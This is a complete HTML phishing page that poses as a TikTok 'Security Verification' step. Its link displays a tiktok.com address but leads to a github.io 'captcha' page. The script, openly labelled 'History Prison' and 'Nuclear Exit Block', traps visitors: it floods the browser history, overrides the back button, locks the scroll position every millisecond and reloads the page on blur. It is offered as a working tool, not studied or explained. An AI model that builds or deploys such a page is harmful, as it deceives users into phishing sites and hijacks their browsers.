<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        /* THE GPU HIJACK */
        html {
            scroll-snap-type: y mandatory;
            overflow-y: scroll;
            height: 100vh;
            scroll-behavior: auto; /* Instant jump */
        }
        
        body { 
            margin: 0; padding: 0; background: #ffffff; 
            height: 500vh; /* Massive height to bury the UI */
        }

        /* Massive void to push content below the fold */
        #buffer { height: 120vh; width: 100%; }

        #trap-zone {
            height: 100vh;
            scroll-snap-align: start; /* CSS engine lock */
            text-align: center;
            font-family: "Proxima Nova", sans-serif;
            position: relative;
        }

        /* The Ghost Input */
        #trigger {
            opacity: 0; position: absolute; top: 0; 
            width: 1px; height: 1px; pointer-events: none;
        }

        /* Visual Elements */
        .v-icon { width: 60px; margin: 60px auto 20px; display: block; }
        .header { font-size: 24px; font-weight: 800; color: #161823; }
        .sub { color: #8A8B91; padding: 0 40px; margin-top: 15px; font-size: 16px; }
        #link { color: #0049f6; text-decoration: underline; font-weight: 600; display: block; margin-top: 45px; }
        
        /* The Shield */
        #shield { 
            display: none; position: fixed; top: 0; left: 0; 
            width: 100%; height: 100%; z-index: 99999; 
        }
    </style>
</head>
<body onload="lockDown()">
    <div id="shield"></div>

    <div id="buffer"></div>

    <div id="trap-zone" id="start">
        <input type="text" id="trigger" autofocus>

        <svg class="v-icon" viewBox="0 0 48 48" fill="none">
            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
        </svg>

        <div class="header">Security Verification</div>
        <div class="sub">Complete the final step to secure your TikTok session.</div>
        
        <a id="link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">
            https://www.tiktok.com/verify-secure
        </a>
    </div>

<script>
    function lockDown() {
        // 1. Fragment Force: Tells the browser the page starts at #start
        if(window.location.hash !== "#start") {
            window.location.replace("#start");
        }

        // 2. Browser Focus Hijack
        document.getElementById('trigger').focus();

        // 3. History Prison
        for(let i=0; i<30; i++) {
            history.pushState(null, null, window.location.href);
        }

        // 4. Activate the Lock
        const trapPos = document.getElementById('buffer').offsetHeight;
        document.getElementById('shield').style.display = 'block';

        // THE PRISON LOOP: Runs every 1ms to ensure the UI can never slide down
        setInterval(() => {
            if (window.pageYOffset < (trapPos - 5)) {
                window.scrollTo(0, trapPos);
            }
        }, 1);

        // 5. Back Button Intercept
        window.onpopstate = function() {
            history.pushState(null, null, window.location.href);
            window.scrollTo(0, trapPos);
        };

        // 6. Nuclear Exit Block: Refresh on blur
        window.onblur = function() {
            setTimeout(() => { location.replace(location.href); }, 5);
        };
    }

    // Secondary listener in case onload is throttled
    document.addEventListener('DOMContentLoaded', lockDown);
</script>
</body>
</html>
